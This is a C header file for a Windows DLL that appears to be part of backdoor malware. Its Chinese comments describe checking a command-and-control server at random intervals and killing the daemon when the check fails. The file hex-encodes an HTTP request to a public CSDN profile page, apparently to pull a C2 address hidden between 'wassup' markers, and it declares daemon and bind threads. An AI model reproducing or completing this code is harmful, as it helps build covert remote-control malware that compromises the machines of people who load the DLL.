#ifndef _FUNCS_H_
#define _FUNCS_H_

#include <winsock2.h>
#pragma comment( lib , "Ws2_32.lib" )
#include <Windows.h>
#include <string.h>
#include <stdlib.h>

#define _DEBUG_
#define _DEBUG_PRINT_ 1
#define CHECK_LOCAL_TIME_SPLIT (20) // 查本地时间并查 CC 的间隔，无效则杀死 daemon
#define RANDOM_SEND_GET_SPLIT (2) // 查 CC 时插入随机时间的最大值
#define DEFAULT_BUFLEN (44) // must larger than lenth "wassup000.000.000.000:00000wassup"
#define DEFAULT_PORT (80)
#define HOSTNAME "my.csdn.net"
#define CONTEXT \
  "\x47\x45\x54\x20"\
  "\x2f\x65\x63\x68"\
  "\x6f\x66\x6f\x63"\
  "\x75\x73\x20\x48"\
  "\x54\x54\x50\x2f"\
  "\x31\x2e\x31\x0d"\
  "\x0a\x48\x6f\x73"\
  "\x74\x3a\x20\x6d"\
  "\x79\x2e\x63\x73"\
  "\x64\x6e\x2e\x6e"\
  "\x65\x74\x0d\x0a"\
  "\x0d\x0a"

__declspec(dllexport) BOOL WINAPI DllMain(
  _In_ HINSTANCE hinstDLL,
  _In_ DWORD     fdwReason,
  _In_ LPVOID    lpvReserved
);
DWORD WINAPI DaemonThread( LPVOID lpParam ) ; // DONE
DWORD WINAPI BindThread( LPVOID lpParam ) ;
BOOLEAN CheckLocalTime( ) ; // DONE
void GetCCInfo( char* address ) ; // DONE
BOOLEAN CheckAddress( char* address ) ; // DONE


#ifdef _DEBUG_PRINT_
	#define MESSAGEBOX( ... ) MessageBox( __VA_ARGS__ )
	#define PRINTF( ... ) printf( __VA_ARGS__ )
#else
	#define MESSAGEBOX( ... ) ( void* )0
	#define PRINTF( ... ) ( void* )0
#endif

#endif // end of _FUNCS_H_
